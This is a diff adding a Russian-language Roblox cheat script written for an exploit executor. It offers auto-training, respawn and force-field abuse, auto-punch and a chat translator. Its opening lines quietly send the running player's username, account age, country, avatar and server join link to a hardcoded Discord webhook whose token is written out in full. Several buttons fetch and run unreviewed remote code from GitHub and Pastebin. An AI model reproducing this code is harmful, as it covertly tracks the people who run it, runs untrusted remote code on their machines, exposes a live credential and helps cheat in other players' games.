@@ -1,0 +1,1079 @@
+
+local p = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
+pcall(function()
+    p = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
+end)
+
+
+local LocalizationService = game:GetService("LocalizationService")
+local DT = DateTime.fromUnixTimestamp(86400 * game.Players.LocalPlayer.AccountAge)
+local Days = tonumber(DT:FormatUniversalTime("DD", "en-us"))
+local Months = tonumber(DT:FormatUniversalTime("MM", "en-us"))
+local Years = tonumber(DT:FormatUniversalTime("YYYY", "en-us")) - 1970 
+local result3 = (Years.." Года "..Months.. " Месяцев " ..Days.. " Дней") 
+
+local players = game.Players:GetPlayers()
+local seconds = math.floor(workspace.DistributedGameTime)
+			local minutes = math.floor(workspace.DistributedGameTime / 60)
+			local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
+			local seconds = seconds - (minutes * 60)
+			local minutes = minutes - (hours * 60)
+
+
+
+
+local JL = "https://www.roblox.com/home?placeID="..game.PlaceId.."&gameID="..game.JobId
+
+
+
+   local Webhook = "https://discord.com/api/webhooks/1016829682529869905/kw-bQyLBspYU_yi5q7wAC8vZSA7CooNvt3xcal-OZ9v8G9jGwfztmNDNsUapiIHtbaHB"
+local data = {
+        ["username"] = "",
+        ["avatar_url"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = game.Players.LocalPlayer.Name,
+                },
+                ["description"] = "Акаунту: **"..result3.."**\n".."\nНазвание Игры: **"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."**\n".."\n**Айди Плейса: **[" .. game.PlaceId .. "](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) .. ")**\n".."\nПрисоеденится: **"..JL.. "**\n".."\nСтрана: **"..LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer).."**\n".."\nИгроков на сервере:** "..#players.."  из  "..game.Players.MaxPlayers.."**\n".."\nВремени на сервере: **"..hours .. " Час(ов) " .. minutes .. " Минут " .. seconds .. " Секунд ".."**\n",
+                ["color"] = tonumber(0x7269da),
+                ["thumbnail"] = {
+                    ["url"] = p
+                }
+            }
+        }
+    }
+    local newdata = game.HttpService:JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = {Url = Webhook, Body = newdata, Method = "POST", Headers = headers}
+    syn.request(request)
+
+
+
+
+local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/sol"))()
+
+local win = SolarisLib:New({
+  Name = "RF",
+  FolderToSave = "CLANRF"
+})
+
+local tab = win:Tab("pvp")
+
+local pvp = tab:Section("pvp")
+
+local kos = {}
+--[function]--[function]--[function]--[function]
+local playerfiststat = game:GetService("Players").LocalPlayer.PrivateStats.FistStrength.Value
+	local Spheres = ""
+
+	repeat wait() until game.Players.LocalPlayer.PrivateStats:FindFirstChild("FistStrength")
+
+	if playerfiststat >= 999 and playerfiststat <= 10000 then Spheres = "EnergySphere1"
+	elseif playerfiststat >= 9999 and playerfiststat <= 100000 then Spheres = "EnergySphere2"
+	elseif playerfiststat >= 99999 and playerfiststat <= 1000000 then Spheres = "EnergySphere3"
+	elseif playerfiststat >= 999999 and playerfiststat <= 10000000 then Spheres = "EnergySphere4"
+	elseif playerfiststat >= 9999999 and playerfiststat <= 100000000 then Spheres = "EnergySphere5"
+	elseif playerfiststat >= 99999999 and playerfiststat <= 10000000000 then Spheres = "EnergySphere6"
+	elseif playerfiststat >= 9999999999 and playerfiststat <= 1000000000000 then Spheres = "EnergySphere7"
+	elseif playerfiststat >= 999999999999 and playerfiststat <= 1000000000000000 then Spheres = "EnergySphere8"
+	elseif playerfiststat >= 999999999999999 then Spheres = "EnergySphere9"
+	end
+
+--voiddel
+game:GetService("Workspace").FallenPartsDestroyHeight = math.huge-math.huge
+--voiddel
+
+
+--pp
+
+local playerppstat = game:GetService("Players").LocalPlayer.PrivateStats.PsychicPower.Value
+local ppstat = ""
+if playerppstat >= 0 and playerppstat <= 9999 then ppstat = "+PP1"
+elseif playerppstat >= 9999 and playerppstat <= 999999 then ppstat = "+PP2"
+elseif playerppstat >= 999999 and playerppstat <= 999999999 then ppstat = "+PP3"
+elseif playerppstat >= 999999999 and playerppstat <= 99999999999 then ppstat = "+PP4"
+elseif playerppstat >= 999999999999 and playerppstat <= 99999999999999 then ppstat = "+PP5"
+elseif playerppstat >= 999999999999999 then ppstat = "+PP6"
+end
+
+--pp
+
+--fs
+
+local playerfiststat = game:GetService("Players").LocalPlayer.PrivateStats.FistStrength.Value
+local fiststat = ""
+if playerfiststat >= 0 and playerfiststat <= 19 then fiststat = "+FS1"
+elseif playerfiststat >= 19 and playerfiststat <= 99999 then fiststat = "+FS2"
+elseif playerfiststat >= 99999 and playerfiststat <= 999999999 then fiststat = "+FS3"
+elseif playerfiststat >= 999999999 and playerfiststat <= 99999999999 then fiststat = "+FS4"
+elseif playerfiststat >= 99999999999 and playerfiststat <= 9999999999999 then fiststat = "+FS5"
+elseif playerfiststat >= 9999999999999 then fiststat = "+FS6"
+end
+ --fs
+function PlayerJoined(text)
+    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+        Text = text;
+        Color = Color3.fromRGB(0, 255, 26);
+        Font = Enum.Font.SourceSansBold;
+        TextSize = 20
+    })
+end
+
+
+function PlayerLeft(text)
+    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+        Text = text;
+        Color = Color3.fromRGB(255, 0, 0);
+        Font = Enum.Font.SourceSansBold;
+        TextSize = 20
+    })
+end
+
+
+game:GetService("Players").PlayerAdded:Connect(function(whojoined)
+    PlayerJoined(whojoined.DisplayName.." (@"..whojoined.Name..") has joined the game")
+end)
+
+game:GetService("Players").PlayerRemoving:Connect(function(wholeft)
+    PlayerLeft(wholeft.DisplayName.." (@"..wholeft.Name..") has left the game")
+end)
+
+--[function]--[function]--[function]--[function]
+pvp:Bind("S-Z", Enum.KeyCode.Y, true, "", function()
+ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(459.381989, 246.729996, 886.950989)
+end)
+
+pvp:Bind("Respawn", Enum.KeyCode.F2, true, "", function()
+ task.wait()
+    game.Lighting.Blur.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
+         lastlocationx = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.x
+            lastlocationy = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.y
+            lastlocationz = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.z
+            task.wait()
+            game.Players.LocalPlayer.Character.Health:Destroy()
+            game.Players.LocalPlayer.Character.Animate:Destroy()
+            game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
+            wait(3)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastlocationx, lastlocationy, lastlocationz)
+end)
+
+pvp:Button("Dead-Log", function()
+    for i,v in pairs(game.Players:GetPlayers()) do
+    
+    
+local PlayerN = game.Players[v.Name].Name.." "
+
+local Ymer = {
+
+"  "..PlayerN.."[💀] Dead",
+}
+
+local function SendMessage(chatProperties) 
+game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage',chatProperties)
+end
+
+local player = game.Players[v.Name]
+
+player.Character.Humanoid.Died:Connect(function()
+
+
+
+SendMessage({
+Text = Ymer[math.random(#Ymer)],
+Color = Color3.fromRGB(225,0,0)
+})
+
+end)
+
+player.CharacterAdded:Connect(function(Character)
+Character:WaitForChild("Humanoid").Died:Connect(function()
+
+SendMessage({
+Text = Ymer[math.random(#Ymer)],
+Color = Color3.fromRGB(225,0,0)
+})
+end)
+end)
+end
+    end)
+
+
+local toggle = pvp:Toggle("Auto Re-Join", false,"Toggle", function(st)
+local plr = game.Players.LocalPlayer
+            local tps = game:GetService("TeleportService")
+
+game:GetService("GuiService").ErrorMessageChanged:Connect(function()
+wait (0.3) 
+
+		game.Players.LocalPlayer:Kick("\nRe-join...")
+		wait()
+
+		tps:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+		end);
+end)
+
+pvp:Button("Re-Join", function()
+
+        local plr = game.Players.LocalPlayer
+        local tps = game:GetService("TeleportService")
+
+		tps:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+end)
+
+pvp:Button("Cbring", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/shuuuiiiii/baba/main/saplkfpasd", true))()
+  SolarisLib:Notification("?", "Это Cbring впиши ник в поле и нажми `+` чтобы скрипт заработал")
+end)
+
+
+
+local toggle = pvp:Toggle("FF abuse", false,"Toggle", function(a)
+    local v = game.Players.LocalPlayer.Character:FindFirstChild("ForceField")
+    aa = a
+    while aa do
+        wait(3)
+        if game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
+            for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if v.Name == "ForceField" then
+                    v:Destroy()
+
+                end
+            end
+        end
+        spawn(function()
+            wait(2)
+            game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
+            game.Lighting.Blur.Enabled = false
+            game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
+            game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
+        end)
+        spawn(function()
+            wait(0.4)
+            for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if v.Name == "RightHand" then
+                    v:Destroy()
+                end
+            end
+        end)
+    end
+end)
+
+
+pvp:Button("Stack Synapse X", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuuuiiiii/ajiefo/main/faoiswedf"))()
+end)
+    
+local toggle = pvp:Toggle("Stack", false,"Toggle", function(st)
+stt = st
+		while stt do
+			task.wait()
+			pcall (function()
+					local args = {[1] = {[1] = "Skill_SpherePunch",[2] = Vector3.new(x2,100000000000000000000000000,z2)}}
+					game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+					       end)
+			end
+end)
+
+
+local toggle = pvp:Toggle("Respawn 85%", false,"Toggle", function(resp)
+    suss = resp
+while suss do
+    task.wait()
+    pcall(function()
+        game.Lighting.Blur.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
+                if game.Players.LocalPlayer.Character.Humanoid.Health < game.Players.LocalPlayer.Character.Humanoid.MaxHealth * .85 then
+                    local j = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()
+                    local s = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()
+                    local z = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()                    
+                    task.wait()
+                    game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
+                    game.Players.LocalPlayer.Character:Destroy()
+                    game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
+                    task.wait(2.1)
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(j)
+                    wait()
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(s)
+                    wait()
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(z)
+            local plr = game.Players.LocalPlayer
+            local tps = game:GetService("TeleportService")
+
+game:GetService("GuiService").ErrorMessageChanged:Connect(function()
+wait (0.3) 
+
+		game.Players.LocalPlayer:Kick("\nRe-join...")
+		wait()
+
+		tps:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+
+end); 
+
+
+            end
+        
+            end)
+end
+
+end)
+
+local toggle = pvp:Toggle("Anti [B]", false,"Toggle", function(app)
+sp = app
+while sp do
+    task.wait()
+    pcall(function()
+        game.Players.LocalPlayer.Character.Humanoid.Animator:Destroy()
+end)
+end
+end)
+
+local toggle = pvp:Toggle("Auto C", false,"Toggle", function(ac)
+acc = ac
+while acc do task.wait()
+    pcall(function()
+local args = {[1] = {[1] = "Skill_Punch",[2] = "Right"}}
+local arg = {[1] = {[1] = "Skill_Punch",[2] = "Left"}}
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(arg))
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+end)
+end
+end)
+
+--train--train--train
+
+local label = pvp:Label("Soon...")
+local trr = win:Tab("Train")
+local tr = trr:Section("Train")
+
+tr:Button("+Stats", function()
+
+local statplus = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local fs = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+local bt = Instance.new("TextLabel")
+local pp = Instance.new("TextLabel")
+local tt = Instance.new("TextLabel")
+local tim = Instance.new("TextLabel")
+
+--Properties:
+
+statplus.Name = "statplus"
+statplus.Parent = game.CoreGui
+statplus.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = statplus
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(0.237391308, 0, 0.745046258, 0)
+Frame.Size = UDim2.new(0, 129, 0, 193)
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Size = UDim2.new(0, 129, 0, 193)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=11162928233"
+
+fs.Name = "fs"
+fs.Parent = ImageLabel
+fs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fs.BackgroundTransparency = 1.000
+fs.Size = UDim2.new(0, 129, 0, 39)
+fs.Font = Enum.Font.SourceSansBold
+fs.Text = "Fist : "
+fs.TextColor3 = Color3.fromRGB(255, 255, 255)
+fs.TextScaled = true
+fs.TextSize = 14.000
+fs.TextWrapped = true
+fs.TextXAlignment = Enum.TextXAlignment.Left
+
+UICorner.Parent = ImageLabel
+
+bt.Name = "bt"
+bt.Parent = ImageLabel
+bt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+bt.BackgroundTransparency = 1.000
+bt.Position = UDim2.new(0, 0, 0.202072546, 0)
+bt.Size = UDim2.new(0, 129, 0, 39)
+bt.Font = Enum.Font.SourceSansBold
+bt.Text = "Body : "
+bt.TextColor3 = Color3.fromRGB(255, 255, 255)
+bt.TextScaled = true
+bt.TextSize = 14.000
+bt.TextWrapped = true
+bt.TextXAlignment = Enum.TextXAlignment.Left
+
+pp.Name = "pp"
+pp.Parent = ImageLabel
+pp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+pp.BackgroundTransparency = 1.000
+pp.Position = UDim2.new(0, 0, 0.398963749, 0)
+pp.Size = UDim2.new(0, 129, 0, 39)
+pp.Font = Enum.Font.SourceSansBold
+pp.Text = "Psych : "
+pp.TextColor3 = Color3.fromRGB(255, 255, 255)
+pp.TextScaled = true
+pp.TextSize = 14.000
+pp.TextWrapped = true
+pp.TextXAlignment = Enum.TextXAlignment.Left
+
+tt.Name = "tt"
+tt.Parent = ImageLabel
+tt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+tt.BackgroundTransparency = 1.000
+tt.Position = UDim2.new(0, 0, 0.60103631, 0)
+tt.Size = UDim2.new(0, 129, 0, 39)
+tt.Font = Enum.Font.SourceSansBold
+tt.Text = "Token : "
+tt.TextColor3 = Color3.fromRGB(255, 255, 255)
+tt.TextScaled = true
+tt.TextSize = 14.000
+tt.TextWrapped = true
+tt.TextXAlignment = Enum.TextXAlignment.Left
+
+tim.Name = "tim"
+tim.Parent = ImageLabel
+tim.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+tim.BackgroundTransparency = 1.000
+tim.Position = UDim2.new(0, 0, 0.803108871, 0)
+tim.Size = UDim2.new(0, 129, 0, 39)
+tim.Font = Enum.Font.SourceSansBold
+tim.Text = "Time : "
+tim.TextColor3 = Color3.fromRGB(255, 255, 255)
+tim.TextScaled = true
+tim.TextSize = 14.000
+tim.TextWrapped = true
+tim.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Scripts:
+
+local suffixes = {'','K','M','B','T','Qa','Qi'}
+local function format(val)
+	for i=1, #suffixes do
+		if tonumber(val) < 10^(i*3) then
+			return math.floor(val/((10^((i-1)*3))/100))/(100)..suffixes[i]
+		end
+	end
+end
+
+
+local FSV1 = game.Players.LocalPlayer.PrivateStats.FistStrength.Value
+local BTV1 = game.Players.LocalPlayer.PrivateStats.BodyToughness.Value
+local PPV1 = game.Players.LocalPlayer.PrivateStats.PsychicPower.Value
+local Token1 = game.Players.LocalPlayer.PrivateStats.Token.Value
+
+
+
+
+local function MSUSL_fake_script() -- tim.LocalScript 
+	local script = Instance.new('LocalScript', tim)
+
+	local sec = 0
+	
+	
+	
+	local minn = 0
+	
+	
+	
+	local cha = 0
+	
+	
+	local par = script.Parent
+	
+	_G.as = true
+	
+	while true do
+	
+	
+	
+		if _G.as == true then
+	
+			sec = sec + 1
+	
+			wait(1)
+
+	local fs2 = game.Players.LocalPlayer.PrivateStats.FistStrength.Value
+	local bt2 = game.Players.LocalPlayer.PrivateStats.BodyToughness.Value
+	local pp2 = game.Players.LocalPlayer.PrivateStats.PsychicPower.Value
+	local Token2 = game.Players.LocalPlayer.PrivateStats.Token.Value
+
+fs.Text = "Fist : "..format(fs2 - FSV1)
+bt.Text = "Body : "..format(bt2 - BTV1)
+pp.Text = "Psychic : "..format(pp2 - PPV1)
+tt.Text = "Token: "..format(Token2 - Token1)
+
+		end --if zaman baslaticisi end
+	
+	
+		if sec  >= 60 then
+			sec = 0
+			minn = minn + 1
+	
+		end --if saniye 60 end
+	
+	
+		if minn  >= 60 then
+			minn = 0
+			cha = cha + 1
+	
+		end --if dakika 60 end
+	
+		par.Text = "Time : "..cha..":"..minn..":"..sec
+	end
+end
+coroutine.wrap(MSUSL_fake_script)()
+
+
+end)
+
+tr:Button("Anti-Afk", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
+end)
+
+
+tr:Bind("Splitting", Enum.KeyCode.F5, true, "", function()
+  game.Players.LocalPlayer.Character.UpperTorso.Waist:Destroy()
+end)
+
+local toggle = tr:Toggle("Fist Train", false,"Toggle", function(tfs)
+    ttfs = tfs
+while ttfs do task.wait()
+    pcall(function()
+local playerfsstat = game:GetService("Players").LocalPlayer.PrivateStats.FistStrength.Value
+local tpplayer = game.Players.LocalPlayer.Character.HumanoidRootPart
+if playerfsstat >= 19 and playerfsstat <= 99999 then tpplayer.CFrame = CFrame.new(382, 249, 971)
+    local args = { [1] = { [1] = fiststat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerfsstat >= 99999 and playerfsstat <= 999999999 then tpplayer.CFrame = CFrame.new(-2273, 1943, 1048)
+    local args = { [1] = { [1] = fiststat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerfsstat >= 999999999 and playerfsstat <= 9999999999 then tpplayer.CFrame = CFrame.new(1176, 4789, -2293)
+    local args = { [1] = { [1] = fiststat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerfsstat >= 9999999999 and playerfsstat <= 999999999999 then tpplayer.CFrame = CFrame.new(1381, 9274, 1648)
+    local args = { [1] = { [1] = fiststat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerfsstat >= 999999999999 then  tpplayer.CFrame = CFrame.new(-363, 15735, -3)
+    local args = { [1] = { [1] = fiststat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+end
+        end)
+    end
+end)
+
+
+local toggle = tr:Toggle("Psych Train", false,"Toggle", function(tpp)
+ttpp = tpp
+while ttpp do task.wait()
+    pcall(function()
+        local playerppstat = game:GetService("Players").LocalPlayer.PrivateStats.PsychicPower.Value
+local tpplayer = game.Players.LocalPlayer.Character.HumanoidRootPart
+if playerppstat >= 999999 and  playerppstat <= 999999999 then tpplayer.CFrame = CFrame.new(-2527, 5486, -532)
+    local args = { [1] = { [1] = ppstat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerppstat >= 999999999 and playerppstat <= 999999999999  then tpplayer.CFrame = CFrame.new(-2560, 5500, -439)
+    local args = { [1] = { [1] = ppstat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerppstat >= 999999999999 and playerppstat <= 999999999999999 then tpplayer.CFrame = CFrame.new(-2582, 5516, -504)
+    local args = { [1] = { [1] = ppstat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+elseif playerppstat >= 999999999999999 then tpplayer.CFrame = CFrame.new(-2544, 5412, -495)
+    local args = { [1] = { [1] = ppstat } } game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+end
+        end)
+    end
+end)
+
+
+local toggle = tr:Toggle("MS", false,"Toggle", function(tms)
+ttms = tms
+while ttms do task.wait()
+pcall(function()
+    game.ReplicatedStorage.RemoteEvent:FireServer({"Weight","Weight4"})
+    game.ReplicatedStorage.RemoteEvent:FireServer({"+MS5"})
+        end)
+    end
+end)
+
+local toggle = tr:Toggle("JF", false,"Toggle", function(tjs)
+ttjs = tjs
+while ttjs do task.wait()
+pcall(function()
+    game.ReplicatedStorage.RemoteEvent:FireServer({"Weight","Weight4"})
+    game.ReplicatedStorage.RemoteEvent:FireServer({"+JF5"})
+        end)
+    end
+end)
+
+local toggle = tr:Toggle("Back", false,"Toggle", function(da)
+ba = da
+  while  ba do task.wait()
+        game.Lighting.Blur.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
+        pcall(function()
+                if
+                    game.Players.LocalPlayer.Character.Humanoid.Health < game.Players.LocalPlayer.Character.Humanoid.MaxHealth * .10
+                then
+                    local j = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()
+                    game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
+                    task.wait(6)
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(j)
+                    wait()
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(j)
+                    wait()
+                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(j)
+            end
+        end)
+  end
+end)
+
+
+local ff = win:Tab("Test")
+local f = ff:Section("Test")
+
+
+local toggle = f:Toggle("Auto on/off Aura", false,"Toggle", function(aur)
+    auur = aur
+    while auur do task.wait()
+        pcall(function()
+   game.ReplicatedStorage.RemoteEvent:FireServer({"ConcealRevealAura"})
+        end)
+end
+end)
+
+f:Button("Translator", function()
+
+if not game['Loaded'] then game['Loaded']:Wait() end; repeat wait(.06) until game:GetService('Players').LocalPlayer ~= nil
+local YourLang = "ru" -- Language code that the messages are going to be translated to
+
+local googlev = isfile'googlev.txt' and readfile'googlev.txt' or ''
+
+function googleConsent(Body) -- Because google really said: "Fuck you."
+    local args = {}
+
+    for match in Body:gmatch('<input type="hidden" name=".-" value=".-">') do
+        local k,v = match:match('<input type="hidden" name="(.-)" value="(.-)">')
+        args[k] = v
+    end
+    googlev = args.v
+    writefile('googlev.txt', args.v)
+end
+
+local function got(url, Method, Body) -- Basic version of https://www.npmjs.com/package/got using synapse's request API for google websites
+    Method = Method or "GET"
+    
+    local res = syn.request({
+        Url = url,
+        Method = Method,
+        Headers = {cookie="CONSENT=YES+"..googlev},
+        Body = Body
+    })
+    
+    if res.Body:match('https://consent.google.com/s') then
+        print('consent')
+        googleConsent(res.Body)
+        res = syn.request({
+            Url = url,
+            Method = "GET",
+            Headers = {cookie="CONSENT=YES+"..googlev}
+        })
+    end
+    
+    return res
+end
+
+local languages = {
+    auto = "Automatic",
+    af = "Afrikaans",
+    sq = "Albanian",
+    am = "Amharic",
+    ar = "Arabic",
+    hy = "Armenian",
+    az = "Azerbaijani",
+    eu = "Basque",
+    be = "Belarusian",
+    bn = "Bengali",
+    bs = "Bosnian",
+    bg = "Bulgarian",
+    ca = "Catalan",
+    ceb = "Cebuano",
+    ny = "Chichewa",
+    ['zh-cn'] = "Chinese Simplified",
+    ['zh-tw'] = "Chinese Traditional",
+    co = "Corsican",
+    hr = "Croatian",
+    cs = "Czech",
+    da = "Danish",
+    nl = "Dutch",
+    en = "English",
+    eo = "Esperanto",
+    et = "Estonian",
+    tl = "Filipino",
+    fi = "Finnish",
+    fr = "French",
+    fy = "Frisian",
+    gl = "Galician",
+    ka = "Georgian",
+    de = "German",
+    el = "Greek",
+    gu = "Gujarati",
+    ht = "Haitian Creole",
+    ha = "Hausa",
+    haw = "Hawaiian",
+    iw = "Hebrew",
+    hi = "Hindi",
+    hmn = "Hmong",
+    hu = "Hungarian",
+    is = "Icelandic",
+    ig = "Igbo",
+    id = "Indonesian",
+    ga = "Irish",
+    it = "Italian",
+    ja = "Japanese",
+    jw = "Javanese",
+    kn = "Kannada",
+    kk = "Kazakh",
+    km = "Khmer",
+    ko = "Korean",
+    ku = "Kurdish (Kurmanji)",
+    ky = "Kyrgyz",
+    lo = "Lao",
+    la = "Latin",
+    lv = "Latvian",
+    lt = "Lithuanian",
+    lb = "Luxembourgish",
+    mk = "Macedonian",
+    mg = "Malagasy",
+    ms = "Malay",
+    ml = "Malayalam",
+    mt = "Maltese",
+    mi = "Maori",
+    mr = "Marathi",
+    mn = "Mongolian",
+    my = "Myanmar (Burmese)",
+    ne = "Nepali",
+    no = "Norwegian",
+    ps = "Pashto",
+    fa = "Persian",
+    pl = "Polish",
+    pt = "Portuguese",
+    pa = "Punjabi",
+    ro = "Romanian",
+    ru = "Russian",
+    sm = "Samoan",
+    gd = "Scots Gaelic",
+    sr = "Serbian",
+    st = "Sesotho",
+    sn = "Shona",
+    sd = "Sindhi",
+    si = "Sinhala",
+    sk = "Slovak",
+    sl = "Slovenian",
+    so = "Somali",
+    es = "Spanish",
+    su = "Sundanese",
+    sw = "Swahili",
+    sv = "Swedish",
+    tg = "Tajik",
+    ta = "Tamil",
+    te = "Telugu",
+    th = "Thai",
+    tr = "Turkish",
+    uk = "Ukrainian",
+    ur = "Urdu",
+    uz = "Uzbek",
+    vi = "Vietnamese",
+    cy = "Welsh",
+    xh = "Xhosa",
+    yi = "Yiddish",
+    yo = "Yoruba",
+    zu = "Zulu"
+};
+
+function find(lang)
+    for i,v in pairs(languages) do
+        if i == lang or v == lang then
+            return i
+        end
+    end
+end
+
+function isSupported(lang)
+    local key = find(lang)
+    return key and true or false 
+end
+
+function getISOCode(lang)
+    local key = find(lang)
+    return key
+end
+
+function stringifyQuery(dataFields)
+    local data = ""
+    for k, v in pairs(dataFields) do
+        if type(v) == "table" then
+            for _,v in pairs(v) do
+                data = data .. ("&%s=%s"):format(
+                    game.HttpService:UrlEncode(k),
+                    game.HttpService:UrlEncode(v)
+                )
+            end
+        else
+            data = data .. ("&%s=%s"):format(
+                game.HttpService:UrlEncode(k),
+                game.HttpService:UrlEncode(v)
+            )
+        end
+    end
+    data = data:sub(2)
+    return data
+end
+
+local reqid = math.random(1000,9999)
+local rpcidsTranslate = "MkEWBc"
+local rootURL = "https://translate.google.com/"
+local executeURL = "https://translate.google.com/_/TranslateWebserverUi/data/batchexecute"
+local fsid, bl
+
+do -- init
+	print('initialize')
+    local InitialReq = got(rootURL)
+    fsid = InitialReq.Body:match('"FdrFJe":"(.-)"')
+    bl = InitialReq.Body:match('"cfb2h":"(.-)"')
+end
+
+local HttpService = game:GetService("HttpService")
+function jsonE(o)
+    return HttpService:JSONEncode(o)
+end
+function jsonD(o)
+    return HttpService:JSONDecode(o)
+end
+
+function translate(str, to, from)
+    reqid+=10000
+    from = from and getISOCode(from) or 'auto'
+    to = to and getISOCode(to) or 'en'
+
+    local data = {{str, from, to, true}, {nil}}
+
+    local freq = {
+        {
+            {
+                rpcidsTranslate, 
+                jsonE(data),
+                nil,
+                "generic"
+            }
+        }
+    }
+
+    local url = executeURL..'?'..stringifyQuery{rpcids = rpcidsTranslate, ['f.sid'] = fsid, bl = bl, hl="en", _reqid = reqid-10000, rt = 'c'}
+    local body = stringifyQuery{['f.req'] = jsonE(freq)}
+    
+    local req = got(url, "POST", body)
+	
+    local body = jsonD(req.Body:match'%[.-%]\n')
+    local translationData = jsonD(body[1][3])
+    local result = {
+        text = "",
+        from = {
+            language = "",
+            text = ""
+        },
+        raw = ""
+    }
+    result.raw = translationData
+    result.text = translationData[2][1][1][6][1][1]
+    
+    result.from.language = translationData[3]
+    result.from.text = translationData[2][5][1]
+
+    return result
+end
+
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+local StarterGui = game:GetService('StarterGui')
+for i=1, 15 do
+    local r = pcall(StarterGui["SetCore"])
+    if r then break end
+    game:GetService('RunService').RenderStepped:wait()
+end
+wait()
+
+local properties = {
+    Color = Color3.new(1,1,0);
+    Font = Enum.Font.SourceSansItalic;
+    TextSize = 16;
+}
+
+game:GetService("StarterGui"):SetCore("SendNotification",
+    {
+        Title = "Chat Translator",
+        Text = "Ported to Google Translate",
+        Duration = 3
+    }
+)
+                  
+properties.Text = "[TR] To send messages in a language, say > followed by the target language/language code, e.g.: >ru or >russian. To disable (go back to original language), say >d."
+StarterGui:SetCore("ChatMakeSystemMessage", properties)
+
+function translateFrom(message)
+    local translation = translate(message, YourLang)
+
+    local text
+    if translation.from.language ~= YourLang then 
+        text = translation.text
+    end
+
+    return {text, translation.from.language}
+end
+
+function get(plr, msg)
+    local tab = translateFrom(msg)
+    local translation = tab[1]
+    if translation then
+        properties.Text = "("..tab[2]:upper()..") ".."[".. plr.Name .."]: "..translation
+        StarterGui:SetCore("ChatMakeSystemMessage", properties)
+    end
+end
+
